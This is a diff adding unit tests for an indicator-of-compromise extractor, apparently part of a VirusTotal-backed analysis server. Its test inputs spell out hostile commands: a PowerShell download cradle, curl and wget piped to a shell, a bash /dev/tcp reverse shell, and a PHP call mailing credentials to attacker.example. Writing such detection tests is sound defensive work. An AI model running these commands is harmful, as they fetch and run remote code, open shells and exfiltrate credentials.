@@ -219,3 +219,50 @@ def test_require_key_missing(monkeypatch):
 def test_require_key_present(monkeypatch):
     monkeypatch.setattr(server, "VT_API_KEY", "deadbeef")
     assert server._require_key() is None
+
+
+# --- _extract_indicators ---------------------------------------------------
+def test_extract_url_host_not_double_counted():
+    text = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/stage2.ps1')"
+    assert server._extract_indicators(text) == [
+        {"indicator": "http://192.0.2.10/stage2.ps1", "type": "url"}
+    ]
+
+
+def test_extract_dedups_same_url():
+    text = "curl http://192.0.2.77/x | bash\nwget http://192.0.2.77/x | sh"
+    assert server._extract_indicators(text) == [{"indicator": "http://192.0.2.77/x", "type": "url"}]
+
+
+def test_extract_bare_ip_with_port():
+    # /dev/tcp host -- bare IP, and the IPv4 match must not absorb the :port.
+    assert server._extract_indicators("bash -i >& /dev/tcp/192.0.2.44/4444 0>&1") == [
+        {"indicator": "192.0.2.44", "type": "ip_address"}
+    ]
+
+
+def test_extract_email_domain():
+    inds = server._extract_indicators('mail("collector@attacker.example", "creds", $b);')
+    assert {"indicator": "attacker.example", "type": "domain"} in inds
+
+
+def test_extract_ignores_hashes_and_code_identifiers():
+    # 32-hex hash + dotted code identifier -> neither is an indicator.
+    text = "h = d41d8cd98f00b204e9800998ecf8427e ; obj = System.Net.WebClient"
+    assert server._extract_indicators(text) == []
+
+
+def test_extract_no_indicators():
+    assert server._extract_indicators("just some plain prose, nothing to see") == []
+
+
+def test_extract_orders_url_then_ip_then_domain():
+    text = "see admin@evil.example and 192.0.2.9 and http://192.0.2.1/x"
+    types = [d["type"] for d in server._extract_indicators(text)]
+    assert types == ["url", "ip_address", "domain"]
+
+
+def test_extract_case_insensitive_url_dedup():
+    inds = server._extract_indicators("HTTP://192.0.2.1/A\nhttp://192.0.2.1/A")
+    assert len(inds) == 1
+    assert inds[0]["type"] == "url"
